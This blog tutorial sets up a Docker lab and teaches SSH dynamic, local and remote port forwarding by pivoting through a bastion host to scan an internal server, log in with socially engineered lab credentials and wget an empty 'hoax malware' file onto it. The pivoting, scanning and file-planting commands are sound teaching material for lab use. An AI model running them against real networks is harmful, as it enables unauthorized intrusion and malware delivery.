---
layout: post
title: "Gain access to an internal machine using Port forwarding"
date: 2020-08-09 12:00:00 +0530
tags: [networking, security, penetration-testing]
---

> Set up a penetration testing environment using docker containers in docker networks to learn various types of port forwarding techniques.

Port forwarding is a technique in which a port in one machine is tunneled to a port in another machine. In simple words, a request made to a port *P1* of a machine *M1* is "forwarded" as a request to port *P2* of a machine *M2*.

Imagine a web application server, where the incoming traffic is filtered by a firewall that allows only traffic to port 80 and 443 and denies the rest. A malicious user found the password to login to the web application server at port 22. But unfortunately, the firewall denies his SSH requests. What if the malicious user could port forward the request coming to port 80 of the web application server to port 22 of it? This way, the SSH requests made at port 80 of the server would be "forwarded" to port 22 and eventually serviced by `sshd` of the server.

### Scenario

Imagine yourself to be a penetration tester. After a successful social engineering attack, you enter the data center and connect your computer to the network. Your social engineering skills are so effective that you managed to learn the SSH login passwords to the jump server (or) bastion server and an internal server in the enterprise network. **Your intention is to place a hoax malware in the internal server (**[**watering hole**](https://en.wikipedia.org/wiki/Watering_hole_attack)**) in the enterprise network**. A bastion server in the data center has two network interfaces. One that connects to the enterprise network and another to the data center network.

![scenario visual](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_setup_experiment_environment/scenario_visual.png)
*scenario visual*

Let's enumerate the information you have:

- The **data center** is in ***172.17.0.0/16*** subnet and the **enterprise** is in ***10.10.10.0/24* subnet**.
- The IP address of **your** machine is ***172.17.0.1****.*
- The IP address of the network interface of the **bastion server** **facing the data center network** is ***172.17.0.2****, *while the network interface that is **facing the enterprise network** is ***10.10.10.2****.*
- The IP address of the** internal server** is ***10.10.10.3***.
- **The internal server** **doesn't have access to the internet**. (Somehow)
- The **SSH login credentials** to the bastion server is `bastion:fortwall` and that of the internal server is `admin:homeportal`.

## Part 1: Setup experiment environment

We shall set up an environment, as shown in the above diagram, in our local machine to perform the attack.

For the environment setup, we shall use [dockers](https://www.docker.com/) to create the relevant network and nodes. For the purpose of this demonstration, ensure that the penetration testing machine has the following utilities installed (most of them found pre-installed in Kali Linux distribution):

- [docker-engine](https://linuxhint.com/install_docker_kali_linux/)
- nmap
- ssh (client)
- proxychains
- python3

#### Setting up the subnets

Use the default bridge network (typically *172.17.0.0/16*) provided by docker-engine as the data center network. To create the enterprise network subnet, run the following docker command:

```bash
docker network create enterprise --subnet 10.10.10.0/24
```

The penetration testing machine automatically gets the IP address *172.17.0.1* when the docker engine is live (at the interface `docker0`. It is the gateway for containers to talk to the internet).

#### Setting up the nodes — modifying the default ssh server docker image

To create a docker container with `sshd` service turned on, we shall use the `[linuxserver/openssh-server](https://hub.docker.com/r/linuxserver/openssh-server)` docker image, with slight modification in `sshd_config`. Create a new file by the name `Dockerfile` and fill in with the following content.

```dockerfile
FROM linuxserver/openssh-server
ADD sshd_config /etc/ssh/sshd_config
```

Then create a file by the name `sshd_config` (which will be used to replace the original configuration in the `linuxserver/openssh-server` docker image), and fill in with the following content.

{% gist kmmanoj/3bd41c6d55ac506064558934c252c04b %}

`sshd_config` is a mere stripped replica of the SSHd configuration file of the `linuxserver/openssh-server` docker image, with the following changes.

- `PasswordAuthentication yes`
- `AllowTcpForwarding yes`

Then, build the docker image by running the following command.

```bash
docker build -t sshserver:latest .
```

#### Setting up the nodes — the bastion server

Now, that we have the SSH server docker image baked, run the following command to spin up a bastion server as a container in the default bridge network.

```bash
docker run -d -e SUDO_ACCESS=true -e USER_NAME=bastion -e USER_PASSWORD=fortwall -e PASSWORD_ACCESS=true --name bastion sshserver:latest
```

To create a secondary interface for the bastion server, run the following command.

```bash
docker network connect enterprise bastion
```

After the setup, the bastion server's network configuration looks similar to the following:

![bastion server network config](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_setup_experiment_environment/bastion_server_network_config.png)
*bastion server network config*

#### Setting up the nodes — internal server

To spin up the internal server as a container, run the following docker command.

```bash
docker run -d -e SUDO_ACCESS=true -e USER_NAME=admin -e USER_PASSWORD=homeportal -e PASSWORD_ACCESS=true --name internal_server --network enterprise sshserver:latest
```

After the setup, the internal server's network configuration looks similar to the following:

![internal server network config](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_setup_experiment_environment/internal_server_network_config.png)
*internal server network config*

***NOTE****: The *`*eth0*`* interface IP of the bastion server may not be 172.17.0.2 if there are other containers running in your machine. The IP address that the bastion server obtains needs to be noted down and used in place of 172.17.0.2 everywhere during the attack.*

## Part 2: Penetration testing

![](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_penetration_testing/image.jpeg)

*I suggest the readers comprehend the port forwarding terminologies with respect to the machine at the readers' end.*

### Recon bastion server

You begin by scanning for open ports in the bastion server, to find out which port serves the SSH service.

![Scan results of the bastion server](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_penetration_testing/scan_results_of_the_bastion_server.png)
*Scan results of the bastion server*

The SSH server is running at **port 2222** of the bastion server and the credentials that you obtained by social engineering works!

### Recon internal server — Dynamic port forwarding

It is time to **pivot** at the bastion server to recon the internal network (*10.10.10.0/24*). How do you perform reconnaissance on the internal server whose IP address is *10.10.10.3*? You could install nmap and other tools in the bastion server, but that doesn't seem to be stealthy!

You plan to allocate a port in your localhost that tunnels traffic to the bastion server, and the bastion server makes requests on your behalf. This method is known as **Dynamic Port Forwarding**.

```text
[localhost]-9050 <-> 2222-[bastion]-bport_any <-> iport_any-[internal_server]
-------> request
<------- response
```

SSH client provides a powerful set of options to execute port forwarding. To execute dynamic port forwarding to communicate with the internal network, run the following command.

```bash
ssh -D 9050 -p2222 -Nf bastion@172.17.0.2
```

`-D` option is used to open a port for dynamic port forwarding. The above command opens port 9050 in localhost and any request to it is forwarded to the bastion which dynamically opens a port for communication.

**Other options:**

`-p`: to specify the port to which SSH request is to be made.
`-N`: Do not execute any command. (I don't need a shell)
`-f`: Run SSH in the background.

Further, you configure the proxychains to run nmap through. Open the file `/etc/proxychains.conf` and add the following record (tab-separated) under the `[ProxyList]` section:

```text
socks5    127.0.0.1    9050  
```

Now, you perform port scanning on the internal server at 10.10.10.3 through the bastion server at 172.17.0.2, to find the port that services SSH requests. To do so, you run the following command:

```bash
proxychains nmap -e docker0 -Pn -sT 10.10.10.3
```

`-e` option forces nmap to use a particular interface (172.17.0.1 in our case)

![Scan results of internal server through the bastion server by dynamic port forwarding](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_penetration_testing/scan_results_of_internal_server_through_the_bastion_server_by_dynamic_port_forwa.png)
*Scan results of internal server through the bastion server by dynamic port forwarding*

### Log in to internal server — Local port forwarding

Now that you learned that the internal server serves SSH service at port 2222, you decide to log in to the server with the credentials that you have. Since the internal server is in another private network, you plan to port forward the requests made to one of the ports of the network interface reachable to you, to port 2222 of the internal server through the bastion server.

When you want to expose a service in a server to a port of an interface reachable to you, use **Local port Forwarding**.

```text
[localhost]-2323 <-> 2222-[bastion]-bport <-> 2222-[internal_server]
-------> request
<------- response
```

To expose SSH service of the internal server on your local machine, run the following command.

```bash
ssh -L 2323:10.10.10.3:2222 -p2222 -Nf bastion@172.17.0.2
```

`-L` option is used to local port forward a request to a remote server. In this case, the request to port 2323 of your machine reaches the internal server at port 2222 through the session with the bastion server. The IP address (i.e. 10.10.10.3) provided as the value for this option should be reachable by the bastion server.

Thus, by running the following command using the socially engineered credentials, you should be able to login to the internal server.

```bash
ssh -p2323 admin@localhost
```

![log in to the internal server by local port forwarding](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_penetration_testing/log_in_to_the_internal_server_by_local_port_forwarding.png)
*log in to the internal server by local port forwarding*

### Install the hoax malware — Remote port forwarding

The final step is to install the hoax malware into the internal server. You plan to host an HTTP file server at your end and `wget` the hoax malware at the internal server. Remember, the internal server has no access to the internet. But, it is able to access all nodes in the enterprise subnet. Hence, you need to expose the HTTP file service running at port 8080 at your end through the bastion server to the internal server at port 8000.

When you want to expose a service running in your machine to a port of an interface reachable to a remote server, use **Remote port Forwarding**.

```text
[localhost]-8080 <-> 2222-[bastion]-8000 <-x-> iport-[internal_server]
<------- request
-------> response
```

To expose the HTTP service of your local machine to the internal server through the bastion server, run the following command.

```bash
ssh -R 8000:127.0.0.1:8080 -p2222 -Nf bastion@172.17.0.2
```

`-R` option is used to remote port forward a response to a remote server. In this case, the request to port 8000 of the bastion server reaches your computer at port 8080. The IP address provided as the value for this option should be "assignable" by your computer. (You could also use `localhost` instead of the IP address of your computer. Localhost = localhost for your computer)

In another terminal, you create an empty hoax malware file by the name `hoax_malware` by running `touch hoax_malware` and start the HTTP file server using the following command.

```bash
python3 -m http.server 8080
```

But wait! You realize that remote port forwarding can only go up to the localhost network interface of the bastion server.

![Remote port forwarding to bastion server's localhost only](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_penetration_testing/remote_port_forwarding_to_bastion_server_s_localhost_only.png)
*Remote port forwarding to bastion server's localhost only*

#### Remote port forwarding through a port that is forwarded locally

This is not a type of port forwarding, but an attempt to show the power of compounding multiple types of port forwarding techniques. You want to somehow install the hoax malware into the internal server. Your thoughts are going wild and creativity is at its peak. You think "*What if I could remote forward it to the internal server itself? I anyways have SSH access to the internal server through port 2323 of my machine"*. Your fingers quickly fidget the following command on your penetration testing machine and you restart the HTTP file server.

```bash
ssh -R 8000:127.0.0.1:8080 -p2323 -Nf admin@localhost
python3 -m http.server 8080
```

And, then switch to the internal server shell terminal and try to download the hoax malware again.

```bash
wget http://localhost:8000/hoax_malware
```

![Compounded port forward](/blog/assets/res/gain_access_to_an_internal_machine_using_port_forwarding_penetration_testing/compounded_port_forward.png)
*Compounded port forward*

**Bingo! MISSION ACCOMPLISHED!**

***NOTE:**** There are multiple ways to gain access to the internal server. The intention of this specific series of steps is to learn port forwarding.*

### More Port forwarding examples in real life

**Docker**, the well-known containerization platform extensively uses **local port forwarding**. The `--publish` or `-p` option enables it. The port specified prefixing the colon `:` is the port on the host which is tunneled to the port of the docker container corresponding to the service it is running.

**Ngrok**, a network utility, lets one open one or more ports to the world! Yes, I mean it, the world! I believe it is using remote port forward technique, which exposes the service running at a port in the local machine to the world through the ngrok service's `hostname:port` that pops up on the screen when one runs the ngrok utility.

**Burpsuite**, a web application penetration testing tool uses dynamic port forwarding. Here, the proxy server is the localhost itself. The proxy server typically runs at port 8080. Burpsuite processes and/or stores the request and forwards it to the server the browser is trying to reach. The response, however, comes back to Burpsuite, which forwards it to the browser and eventually gets rendered on the screen.

I hope you like this article!
